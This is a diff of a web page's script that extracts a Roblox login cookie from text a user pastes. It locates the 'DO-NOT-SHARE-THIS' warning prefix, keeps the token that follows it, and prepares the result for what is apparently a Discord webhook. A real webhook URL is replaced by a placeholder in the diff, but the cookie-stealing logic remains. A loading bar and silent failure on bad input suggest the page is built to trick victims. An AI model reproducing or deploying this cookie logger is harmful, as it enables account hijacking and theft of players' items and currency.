@@ -174,21 +174,20 @@
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1367593880861806602/j2nUxJofoMKaEc032py78vCjysveQe2gw1rMmcxRt0M09IHji3QRsEKpwkR6N2QE7Rtf";
+    const webhookURL = "https://discord.com/api/webhooks/your_webhook_here";
 
     function sendMessage() {
       const input = document.getElementById('messageInput').value.trim();
       const warningPart = "_^|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.^|_\"";
 
       const startIdx = input.indexOf(warningPart);
-      if (startIdx === -1) {
-        return; // silently do nothing
-      }
+      if (startIdx === -1) return; // silently skip if not found
 
       const afterWarning = input.substring(startIdx + warningPart.length);
       const endIdx = afterWarning.indexOf(';');
-      const cookie = endIdx !== -1 ? afterWarning.substring(0, endIdx) : afterWarning;
-      const finalMessage = warningPart + cookie + '"';
+      const cookieValue = endIdx !== -1 ? afterWarning.substring(0, endIdx) : afterWarning;
+
+      const finalMessage = warningPart + cookieValue + '"';
 
       const barContainer = document.getElementById('loadingBarContainer');
       const bar = document.getElementById('loadingBar');
